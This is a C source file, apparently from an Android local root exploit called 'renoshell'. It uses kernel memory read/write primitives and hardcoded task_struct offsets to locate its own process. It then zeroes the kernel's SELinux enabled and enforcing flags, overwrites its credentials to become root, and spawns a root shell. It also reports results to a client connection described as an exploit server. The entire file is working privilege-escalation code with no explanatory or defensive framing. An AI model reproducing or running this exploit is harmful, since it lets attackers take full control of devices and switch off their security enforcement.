#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>

#include <netinet/ip.h>

#include <sys/syscall.h>

#include <sys/mman.h>
#include <sys/uio.h>

#include <sys/resource.h>

#include <unistd.h>
#include <sys/types.h>
#include <string.h>

#include "getroot.h"
#include "sidtab.h"
#include "policydb.h"
#include "offsets.h"

#include <sys/wait.h>
#include <stdint.h>
#include "client.h"
#include "debug.h"

uint64_t opt_kaslr_slide;
const char *my_task_name;

#define TASK_STRUCT_NEXT_OFFSET 0x0478
#define TASK_STRUCT_PID_OFFSET  0x0570
#define TASK_STRUCT_TSP_OFFSET  0x06e0

int get_my_task_struct_p(struct offsets *o, void **ptask)
{
	int ret;
	int tsp_offset;
	struct task_struct_partial *__kernel t;
	struct task_struct_partial tsp;
	void *__kernel task = o->init_task;
	void *__kernel next;
	pid_t my_pid, pid;

	ret = -1;
	my_pid = getpid();
	tsp_offset = get_task_struct_partial_offset(task);
	if (tsp_offset < 0)
		return ret;
	do {
		if(read_at_address_pipe(task + TASK_STRUCT_PID_OFFSET, &pid, sizeof(pid)))
			break;
		t = (struct task_struct_partial *)(task + tsp_offset);
		if(read_at_address_pipe(t, &tsp, sizeof(tsp)))
			break;
		if (strcmp(tsp.comm, my_task_name) == 0 && my_pid == pid) {
			ret = 0;
			*ptask = task;
			break;
		}
		if(read_at_address_pipe(task + TASK_STRUCT_NEXT_OFFSET, &next, sizeof(next)))
			break;
		task = next - TASK_STRUCT_NEXT_OFFSET;
	} while (ret < 0 && task != o->init_task);

	return ret;
}

int getroot(struct offsets* o)
{
	int ret = 1;
	void * __kernel task;
	int tsp_offset;
	int zero = 0;

	sidtab = o->sidtab;
	policydb = o->policydb;

	task = NULL;

	if (client_curr_get_task_struct_p((uint64_t *)&task) < 0)
		return ret;
	tsp_offset = get_task_struct_partial_offset(task);
	if (tsp_offset < 0)
		return ret;

	if (tsp_offset != TASK_STRUCT_TSP_OFFSET)
		PNFO("tsp_offset=0x%04x\n", tsp_offset);

	if (get_my_task_struct_p(o, &task) < 0)
		return ret;
	PNFO("task_struct %p\n", task);

	// we need first to disable selinux completely otherwise tcp communication
	// with our exploit server seems to get denied with user switching to root uid
	if(o->selinux_enabled)
		write_at_address_pipe(o->selinux_enabled, &zero, sizeof(zero));
	if(o->selinux_enforcing)
		write_at_address_pipe(o->selinux_enforcing, &zero, sizeof(zero));

	if((ret = modify_task_cred_uc(task)))
		goto end;

	ret = 0;
end:
	return ret;
}

void reenable_selinux(struct offsets* o)
{
	int one = 1;

	if(o->selinux_enabled)
		write_at_address_pipe(o->selinux_enabled, &one, sizeof(one));
	if(o->selinux_enforcing)
		write_at_address_pipe(o->selinux_enforcing, &one, sizeof(one));
}

int main(int argc, char **argv)
{
	int ret = 1;
	struct offsets* o;
	int uid;

	PNFO("\nrenoshell - rename/notify temp root shell\n");
	PNFO("https://github.com/j4nn/renoshell/README.md\n\n");

	my_task_name = strrchr(argv[0], '/');
	if (my_task_name != NULL)
		my_task_name++;
	else
		my_task_name = argv[0];

	if (client_curr_get_kaslr(&opt_kaslr_slide) == 0)
		PNFO("kaslr slide 0x%zx\n", opt_kaslr_slide);

	if(!(o = get_offsets(opt_kaslr_slide)))
		return 1;

	if (argc > 1 && strcmp(argv[1], "--reenable-selinux") == 0) {
		reenable_selinux(o);
		PNFO("selinux_enabled and selinux_enforcing set to 1\n");
		return 0;
	}

	ret = getroot(o);
	if (ret)
		return ret;

	uid = getuid();
	client_report_uid(uid);

	if (uid == 0) {
		pid_t pid;
		PNFO("\ngot root, start shell...\n\n");
		pid = fork();
		switch (pid) {
		case 0:
			wait(&ret);
			break;
		case -1:
			PRNO("fork");
			ret = 1;
			break;
		default:
			argv[0] = "/system/bin/sh";
			argv[argc] = NULL;
			ret = execv(argv[0], argv);
			PRNO("execv returns ret=%d\n", ret);
			ret = 1;
			break;
		}
	} else {
		PNFO("did not get root, uid=%d\n", uid);
		ret = 1;
	}

	return ret;
}
